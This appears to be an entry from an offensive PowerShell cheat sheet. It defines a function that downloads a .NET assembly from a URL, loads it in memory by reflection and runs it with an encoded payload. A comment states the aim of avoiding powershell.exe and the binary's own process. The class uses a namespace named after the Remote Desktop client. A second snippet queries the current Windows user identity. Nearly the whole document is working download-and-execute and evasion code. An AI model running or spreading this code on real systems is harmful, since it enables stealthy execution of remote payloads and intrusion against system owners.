# Invoke powershell code from binary (or url) without launching powershell.exe or the actual binary process itself
function global:Invoke-InMemory {
[CmdletBinding()]
Param(
[String]$Path,

[String]$EncodedPayload
)

$source = @"
using System;
using System.Net;
using System.Reflection;
namespace mstsc
{
    public static class csharp
    {
        public static void LoadBinary(string url, string payload)
        {
        WebClient wc = new WebClient();
        Byte[] buffer = wc.DownloadData(url);
            var assembly = Assembly.Load(buffer);
var entry = assembly.EntryPoint;
var args = new string[2] {"-enc", payload};
var nothing = entry.Invoke(null, new object[] { args });
        }
    }
}
"@

if (-not ([System.Management.Automation.PSTypeName]'mstsc.csharp').Type)
{
    Add-Type -ReferencedAssemblies $Assem -TypeDefinition $source -Language CSharp
}
[mstsc.csharp]::LoadBinary($Path, $EncodedPayload)
}

# 16. Run C# directly 
$x = @'
public class test
{
    public static string Identity()
        {
            string Name = System.Security.Principal.WindowsIdentity.GetCurrent().Name; 
            return Name;
        }
}
'@

Add-Type $x;
[test]::Identity()